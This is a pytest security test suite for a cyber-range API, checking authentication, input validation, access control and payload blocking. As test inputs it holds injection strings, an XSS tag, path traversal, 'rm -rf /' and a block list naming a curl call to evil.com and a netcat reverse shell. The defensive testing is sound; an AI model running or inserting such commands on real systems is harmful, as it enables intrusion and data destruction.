"""
Security Tests for GAN-Cyber-Range-v2
Comprehensive security validation and penetration testing
"""

import pytest
import asyncio
import uuid
import hashlib
import time
import jwt
from datetime import datetime, timedelta
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock

from gan_cyber_range.api.main import app
from gan_cyber_range.api.auth import user_manager, create_access_token
from gan_cyber_range.utils.security import SecurityManager
from gan_cyber_range.utils.validation import ValidationError
from gan_cyber_range.core.attack_gan import AttackGAN


@pytest.fixture
def client():
    """Test client fixture"""
    return TestClient(app)


@pytest.fixture
def security_manager():
    """Security manager fixture"""
    return SecurityManager()


@pytest.fixture
async def test_user():
    """Create test user fixture"""
    user_data = {
        "username": "sectest",
        "email": "sectest@example.com",
        "password": "SecurePassword123!",
        "role": "researcher"
    }
    return user_manager.create_user(**user_data)


@pytest.fixture
def valid_token(test_user):
    """Valid JWT token fixture"""
    return create_access_token({"sub": test_user["username"], "role": test_user["role"]})


@pytest.fixture
def auth_headers(valid_token):
    """Authentication headers fixture"""
    return {"Authorization": f"Bearer {valid_token}"}


class TestAuthenticationSecurity:
    """Authentication security tests"""
    
    def test_password_hashing(self):
        """Test password hashing security"""
        password = "TestPassword123!"
        user_data = {
            "username": "hashtest",
            "email": "hashtest@example.com",
            "password": password,
            "role": "user"
        }
        
        user = user_manager.create_user(**user_data)
        
        # Password should be hashed, not stored in plaintext
        assert user["password_hash"] != password
        assert len(user["password_hash"]) > 50  # bcrypt hashes are long
        assert user["password_hash"].startswith("$2b$")  # bcrypt identifier
    
    def test_jwt_token_security(self, test_user):
        """Test JWT token security"""
        token = create_access_token({"sub": test_user["username"], "role": test_user["role"]})
        
        # Token should be properly formatted
        assert len(token.split('.')) == 3  # Header.Payload.Signature
        
        # Decode token and verify contents
        from gan_cyber_range.api.auth import JWT_SECRET, JWT_ALGORITHM
        payload = jwt.decode(token, JWT_SECRET, algorithms=[JWT_ALGORITHM])
        
        assert payload["sub"] == test_user["username"]
        assert payload["type"] == "access_token"
        assert "exp" in payload  # Expiration time
        assert "iat" in payload  # Issued at time
    
    def test_jwt_token_expiration(self, test_user):
        """Test JWT token expiration"""
        # Create token with short expiration
        short_token = create_access_token(
            {"sub": test_user["username"], "role": test_user["role"]},
            expires_delta=timedelta(seconds=1)
        )
        
        # Wait for token to expire
        time.sleep(2)
        
        # Token should be expired
        from gan_cyber_range.api.auth import verify_token, AuthenticationError
        with pytest.raises(AuthenticationError, match="Token has expired"):
            verify_token(short_token)
    
    def test_invalid_jwt_signature(self, client):
        """Test invalid JWT signature handling"""
        # Create token with wrong signature
        invalid_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0ZXN0IiwiaWF0IjoxNTE2MjM5MDIyfQ.invalid_signature"
        headers = {"Authorization": f"Bearer {invalid_token}"}
        
        response = client.get("/auth/me", headers=headers)
        assert response.status_code == 401
    
    def test_brute_force_protection(self, client):
        """Test brute force protection"""
        # Attempt multiple failed logins
        for _ in range(10):
            response = client.post("/auth/login", json={
                "username": "nonexistent",
                "password": "wrongpassword"
            })
            assert response.status_code == 401
        
        # Should still be able to login with correct credentials after failed attempts
        # (basic test - in production, would implement proper rate limiting)
        valid_response = client.post("/auth/login", json={
            "username": "admin",  # Default admin user
            "password": "AdminPass123!"
        })
        # This might fail if admin user doesn't exist in test environment
        assert valid_response.status_code in [200, 401]
    
    def test_session_security(self, client, auth_headers):
        """Test session security"""
        # Test that sessions are properly managed
        response = client.get("/auth/me", headers=auth_headers)
        assert response.status_code == 200
        
        # Test session invalidation (logout)
        # Note: This would require implementing logout endpoint
        pass


class TestInputValidationSecurity:
    """Input validation security tests"""
    
    def test_sql_injection_attack_generation(self, client, auth_headers):
        """Test SQL injection in attack generation"""
        malicious_request = {
            "attack_types": ["'; DROP TABLE attacks; --"],
            "num_samples": 5
        }
        
        response = client.post("/attacks/generate", json=malicious_request, headers=auth_headers)
        # Should fail validation, not execute SQL
        assert response.status_code == 422
    
    def test_xss_in_user_input(self, client):
        """Test XSS protection in user input"""
        xss_payload = "<script>alert('XSS')</script>"
        
        user_data = {
            "username": xss_payload,
            "email": "test@example.com",
            "password": "Password123!",
            "full_name": xss_payload,
            "organization": xss_payload,
            "role": "user"
        }
        
        response = client.post("/auth/register", json=user_data)
        
        if response.status_code == 200:
            # If registration succeeds, verify XSS payload is sanitized
            data = response.json()
            assert "<script>" not in str(data)
        else:
            # Input validation should reject malicious input
            assert response.status_code == 422
    
    def test_path_traversal_prevention(self, client, auth_headers):
        """Test path traversal attack prevention"""
        # Attempt path traversal in cyber range name
        malicious_config = {
            "config": {
                "name": "../../etc/passwd",
                "size": "small"
            }
        }
        
        response = client.post("/ranges", json=malicious_config, headers=auth_headers)
        
        if response.status_code == 200:
            # If creation succeeds, verify path is sanitized
            data = response.json()
            assert "../" not in data["name"]
        else:
            # Should fail validation
            assert response.status_code in [400, 422]
    
    def test_command_injection_prevention(self, client, auth_headers):
        """Test command injection prevention"""
        # Attempt command injection in configuration
        malicious_config = {
            "config": {
                "name": "test; rm -rf /",
                "size": "small"
            }
        }
        
        response = client.post("/ranges", json=malicious_config, headers=auth_headers)
        
        # Should either sanitize input or reject it
        assert response.status_code in [200, 400, 422]
    
    def test_buffer_overflow_prevention(self, client, auth_headers):
        """Test buffer overflow prevention"""
        # Send very large payload
        large_payload = "A" * 10000000  # 10MB of data
        
        malicious_request = {
            "attack_types": ["network"],
            "num_samples": 1,
            "payload": large_payload
        }
        
        response = client.post("/attacks/generate", json=malicious_request, headers=auth_headers)
        
        # Should reject oversized input
        assert response.status_code in [400, 413, 422]


class TestAuthorizationSecurity:
    """Authorization security tests"""
    
    def test_role_based_access_control(self, client):
        """Test role-based access control"""
        # Create users with different roles
        user_roles = ["user", "researcher", "admin"]
        tokens = {}
        
        for role in user_roles:
            user_data = {
                "username": f"test_{role}",
                "email": f"test_{role}@example.com",
                "password": "Password123!",
                "role": role
            }
            
            user = user_manager.create_user(**user_data)
            tokens[role] = create_access_token({"sub": user["username"], "role": role})
        
        # Test access to researcher-only endpoints
        researcher_headers = {"Authorization": f"Bearer {tokens['researcher']}"}
        user_headers = {"Authorization": f"Bearer {tokens['user']}"}
        
        # Researcher should have access
        response = client.post("/attacks/generate", json={
            "attack_types": ["network"],
            "num_samples": 1
        }, headers=researcher_headers)
        assert response.status_code == 200
        
        # Regular user should not have access
        response = client.post("/attacks/generate", json={
            "attack_types": ["network"],
            "num_samples": 1
        }, headers=user_headers)
        assert response.status_code == 403
    
    def test_resource_ownership(self, client, auth_headers):
        """Test resource ownership validation"""
        # Create cyber range
        config_data = {
            "config": {
                "name": "Ownership Test Range",
                "size": "small"
            }
        }
        
        response = client.post("/ranges", json=config_data, headers=auth_headers)
        assert response.status_code == 200
        range_id = response.json()["id"]
        
        # Create another user
        other_user_data = {
            "username": "otheruser",
            "email": "other@example.com",
            "password": "Password123!",
            "role": "researcher"
        }
        
        other_user = user_manager.create_user(**other_user_data)
        other_token = create_access_token({"sub": other_user["username"], "role": other_user["role"]})
        other_headers = {"Authorization": f"Bearer {other_token}"}
        
        # Other user should not be able to modify the range
        response = client.post(f"/ranges/{range_id}/stop", headers=other_headers)
        # This would depend on implementation - might be 403 or 404
        assert response.status_code in [403, 404]


class TestDataProtectionSecurity:
    """Data protection and privacy tests"""
    
    def test_password_not_exposed(self, client):
        """Test password not exposed in responses"""
        user_data = {
            "username": "privacy_test",
            "email": "privacy@example.com",
            "password": "SecretPassword123!",
            "role": "user"
        }
        
        response = client.post("/auth/register", json=user_data)
        assert response.status_code == 200
        
        data = response.json()
        assert "password" not in data
        assert "password_hash" not in data
    
    def test_sensitive_data_logging(self, caplog):
        """Test that sensitive data is not logged"""
        with caplog.at_level("DEBUG"):
            user_data = {
                "username": "log_test",
                "email": "log@example.com",
                "password": "LogTestPassword123!",
                "role": "user"
            }
            
            user_manager.create_user(**user_data)
            
            # Check that password is not in logs
            log_text = caplog.text
            assert "LogTestPassword123!" not in log_text
    
    def test_attack_payload_sanitization(self, security_manager):
        """Test attack payload sanitization"""
        malicious_payload = """
        <script>alert('xss')</script>
        '; DROP TABLE users; --
        $(rm -rf /)
        """
        
        # Security manager should sanitize payloads
        sanitized = security_manager.sanitize_attack_payload(malicious_payload)
        
        # Check that malicious content is removed/escaped
        assert "<script>" not in sanitized
        assert "DROP TABLE" not in sanitized
        assert "rm -rf" not in sanitized


class TestNetworkSecurity:
    """Network security tests"""
    
    def test_cors_configuration(self, client):
        """Test CORS configuration"""
        # Test preflight request
        response = client.options("/auth/me", headers={
            "Origin": "http://localhost:3000",
            "Access-Control-Request-Method": "GET",
            "Access-Control-Request-Headers": "Authorization"
        })
        
        # Should allow configured origins
        if "Access-Control-Allow-Origin" in response.headers:
            allowed_origin = response.headers["Access-Control-Allow-Origin"]
            assert allowed_origin in ["http://localhost:3000", "*"]
    
    def test_security_headers(self, client):
        """Test security headers"""
        response = client.get("/health")
        
        # Check for security headers (would be set by nginx in production)
        headers = response.headers
        
        # These might not be present in test environment
        if "X-Content-Type-Options" in headers:
            assert headers["X-Content-Type-Options"] == "nosniff"
        
        if "X-Frame-Options" in headers:
            assert headers["X-Frame-Options"] in ["DENY", "SAMEORIGIN"]
    
    def test_https_enforcement(self, client):
        """Test HTTPS enforcement"""
        # In production, HTTP should redirect to HTTPS
        # This is typically handled by reverse proxy
        pass
    
    def test_rate_limiting(self, client, auth_headers):
        """Test rate limiting"""
        # Make multiple rapid requests
        responses = []
        for _ in range(100):
            response = client.get("/health", headers=auth_headers)
            responses.append(response)
        
        # At some point, should hit rate limit (429)
        status_codes = [r.status_code for r in responses]
        
        # Most should succeed, but some might be rate limited
        assert 200 in status_codes  # Some requests should succeed
        # assert 429 in status_codes  # Some might be rate limited (depends on configuration)


class TestCryptographicSecurity:
    """Cryptographic security tests"""
    
    def test_jwt_algorithm_security(self):
        """Test JWT algorithm security"""
        from gan_cyber_range.api.auth import JWT_ALGORITHM
        
        # Should use secure algorithm
        assert JWT_ALGORITHM in ["HS256", "RS256", "ES256"]
        
        # Should not use 'none' algorithm
        assert JWT_ALGORITHM != "none"
    
    def test_password_strength_requirements(self, client):
        """Test password strength requirements"""
        weak_passwords = [
            "123456",
            "password",
            "qwerty",
            "abc123",
            "Password",  # No number
            "password123",  # No uppercase
            "PASSWORD123",  # No lowercase
            "Pass123"  # Too short
        ]
        
        for weak_password in weak_passwords:
            user_data = {
                "username": f"weak_test_{hash(weak_password)}",
                "email": f"weak_{hash(weak_password)}@example.com",
                "password": weak_password,
                "role": "user"
            }
            
            response = client.post("/auth/register", json=user_data)
            # Should reject weak passwords
            assert response.status_code in [400, 422]
    
    def test_random_generation_security(self):
        """Test random generation security"""
        # Generate multiple tokens and ensure they're different
        tokens = set()
        for _ in range(100):
            user_data = {
                "username": f"random_test_{uuid.uuid4()}",
                "email": f"random_{uuid.uuid4()}@example.com",
                "password": "SecurePassword123!",
                "role": "user"
            }
            
            user = user_manager.create_user(**user_data)
            token = create_access_token({"sub": user["username"], "role": user["role"]})
            tokens.add(token)
        
        # All tokens should be unique
        assert len(tokens) == 100


class TestSecurityConfiguration:
    """Security configuration tests"""
    
    def test_debug_mode_disabled(self):
        """Test that debug mode is disabled in production"""
        # Check environment variables or configuration
        import os
        debug_mode = os.getenv("DEBUG", "false").lower()
        assert debug_mode in ["false", "0", ""]
    
    def test_secret_key_strength(self):
        """Test secret key strength"""
        from gan_cyber_range.api.auth import JWT_SECRET
        
        # Secret key should be strong
        assert len(JWT_SECRET) >= 32  # At least 32 characters
        assert JWT_SECRET != "your-super-secret-key-change-in-production"  # Not default
    
    def test_database_connection_security(self):
        """Test database connection security"""
        import os
        db_url = os.getenv("DATABASE_URL", "")
        
        if db_url:
            # Should use SSL in production
            if "postgresql://" in db_url:
                # In production, should include SSL parameters
                pass  # Would check for sslmode=require etc.


class TestSecurityManager:
    """Security Manager tests"""
    
    def test_attack_generation_validation(self, security_manager):
        """Test attack generation request validation"""
        # Valid request
        valid_request = {
            "attack_types": ["network", "malware"],
            "num_samples": 10,
            "diversity_threshold": 0.8
        }
        
        assert security_manager.validate_attack_generation_request(valid_request) == True
        
        # Invalid requests
        invalid_requests = [
            {"attack_types": [], "num_samples": 10},  # Empty attack types
            {"attack_types": ["network"], "num_samples": 0},  # Zero samples
            {"attack_types": ["network"], "num_samples": 10000000},  # Too many samples
            {"attack_types": ["../../../etc/passwd"], "num_samples": 1},  # Path traversal
        ]
        
        for invalid_request in invalid_requests:
            assert security_manager.validate_attack_generation_request(invalid_request) == False
    
    def test_cyber_range_config_validation(self, security_manager):
        """Test cyber range configuration validation"""
        # Valid configuration
        valid_config = {
            "name": "Test Range",
            "size": "medium",
            "topology": {
                "template": "enterprise",
                "subnets": ["dmz", "internal"]
            }
        }
        
        assert security_manager.validate_cyber_range_config(valid_config) == True
        
        # Invalid configurations
        invalid_configs = [
            {"name": "../../../etc/passwd", "size": "small"},  # Path traversal
            {"name": "test", "size": "invalid_size"},  # Invalid size
            {"name": "test; rm -rf /", "size": "small"},  # Command injection
        ]
        
        for invalid_config in invalid_configs:
            assert security_manager.validate_cyber_range_config(invalid_config) == False
    
    def test_containment_validation(self, security_manager):
        """Test attack containment validation"""
        # Test that attacks are properly contained
        assert security_manager.is_attack_contained("10.0.0.1") == True  # Internal IP
        assert security_manager.is_attack_contained("192.168.1.1") == True  # Private IP
        assert security_manager.is_attack_contained("8.8.8.8") == False  # External IP
        
        # Test dangerous payloads are blocked
        dangerous_payloads = [
            "ping 8.8.8.8",  # External network access
            "curl http://evil.com",  # External HTTP request
            "nc -e /bin/sh 1.2.3.4 4444",  # Reverse shell
        ]
        
        for payload in dangerous_payloads:
            assert security_manager.is_payload_safe(payload) == False


class TestSecurityIncidentResponse:
    """Security incident response tests"""
    
    def test_security_event_logging(self, security_manager):
        """Test security event logging"""
        # Simulate security events
        events = [
            {"type": "failed_login", "username": "admin", "ip": "1.2.3.4"},
            {"type": "suspicious_attack_generation", "user": "testuser", "payload": "malicious"},
            {"type": "unauthorized_access", "endpoint": "/admin", "user": "lowpriv"},
        ]
        
        for event in events:
            security_manager.log_security_event(event)
        
        # Events should be logged (would check log files in real implementation)
        assert True  # Placeholder
    
    def test_automated_response(self, security_manager):
        """Test automated security responses"""
        # Test that system responds to security threats
        
        # Simulate multiple failed login attempts
        for _ in range(10):
            security_manager.log_security_event({
                "type": "failed_login",
                "username": "admin",
                "ip": "1.2.3.4"
            })
        
        # Should trigger automated response (account lockout, IP ban, etc.)
        assert security_manager.is_ip_blocked("1.2.3.4") == True
    
    def test_security_monitoring(self, security_manager):
        """Test security monitoring capabilities"""
        # Test that security monitoring is active
        monitoring_status = security_manager.get_monitoring_status()
        
        assert monitoring_status["active"] == True
        assert "last_scan" in monitoring_status
        assert "threats_detected" in monitoring_status


if __name__ == "__main__":
    pytest.main([__file__, "-v"])